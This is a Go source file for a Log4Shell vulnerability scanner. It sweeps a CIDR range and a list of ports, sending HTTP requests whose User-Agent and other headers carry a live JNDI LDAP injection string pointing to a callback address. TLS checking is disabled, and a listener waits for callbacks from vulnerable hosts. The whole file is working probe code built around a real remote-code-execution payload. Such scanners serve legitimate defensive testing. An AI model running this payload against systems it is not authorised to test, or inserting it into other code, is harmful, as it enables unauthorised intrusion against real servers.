package main

import (
	"context"
	"crypto/tls"
	"embed"
	"encoding/binary"
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"time"
)

// nolint: gochecknoglobals
var version = "dev"

//go:embed resource
var f embed.FS

func request(ctx context.Context, schema string, destCIDR string, destPorts string, callbackAddr string, listen bool) error {
	log.Printf("[i] Start scanning %s CIDR\n---------", destCIDR)

	transport := http.DefaultTransport.(*http.Transport).Clone()
	transport.TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	client := &http.Client{
		Timeout:   time.Millisecond * 75,
		Transport: transport,
	}

	var (
		lh      string = "${jndi:ldap:"
		rh      string = "l4s}"
		payload string = fmt.Sprintf("%v//%v/%v", lh, callbackAddr, rh)
	)

	ports := strings.Split(destPorts, ",")

	headers, err := readHeader()
	if err != nil {
		return err
	}

	_, ipv4Net, err := net.ParseCIDR(destCIDR)
	if err != nil {
		return err
	}

	mask := binary.BigEndian.Uint32(ipv4Net.Mask)
	start := binary.BigEndian.Uint32(ipv4Net.IP)

	finish := (start & mask) | (mask ^ 0xffffffff)

	for i := start; i <= finish; i++ {
		ip := make(net.IP, 4)
		binary.BigEndian.PutUint32(ip, i)

		for _, p := range ports {
			var url string = fmt.Sprintf("%s://%s:%s", schema, ip, p)

			log.Printf("[i] Checking %s\n", url)

			req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
			if err != nil {
				return err
			}

			for _, h := range headers {
				if h == "User-Agent" {
					req.Header.Set("User-Agent", payload)
					continue
				}

				req.Header.Add(h, payload)
			}

			response, err := client.Do(req)
			if err != nil {
				// ignore
				continue
			}
			defer response.Body.Close()
		}
	}

	log.Printf("[i] Completed scanning of CIDR %s\n", destCIDR)
	if listen {
		log.Println("[i] Waiting for incoming callbacks!")
		log.Println("[i] Use ctrl+c to stop the program.")
	}

	return nil
}

func main() {
	var (
		schema       string
		callbackAddr string
		destCIDR     string
		destPorts    string
		listen       bool
		wg           sync.WaitGroup
	)

	flag.StringVar(&callbackAddr, "caddr", "", "address to catch the callbacks (eg. ip:port)")
	flag.StringVar(&schema, "schema", "https", "schema to use for requests")
	flag.StringVar(&destCIDR, "cidr", "192.168.1.0/28", "subnet to scan (default 192.168.1.0/28)")
	flag.StringVar(&destPorts, "ports", "8080", "ports (comma separated) to scan (default 8080)")
	flag.BoolVar(&listen, "listen", false, "start a listener to catch callbacks (default false)")

	flag.Parse()

	log.Printf("[i] Log4Shell Vulnerability Scanner %s\n---------", version)

	ctx, cancel := context.WithCancel(context.Background())

	if listen {
		wg.Add(1)
		go startCatcher(ctx, callbackAddr, &wg)
	}

	// waiting for catcher
	wg.Wait()

	err := request(ctx, schema, destCIDR, destPorts, callbackAddr, listen)
	if err != nil {
		log.Fatal(err)
	}

	signalChan := make(chan os.Signal, 1)

	signal.Notify(signalChan, os.Interrupt)

	<-signalChan

	cancel()

	log.Printf("[i] Bye")
}

func readHeader() ([]string, error) {
	data, err := f.ReadFile("resource/header.txt")
	if err != nil {
		return nil, err
	}

	return strings.Split(string(data), "\n"), nil
}
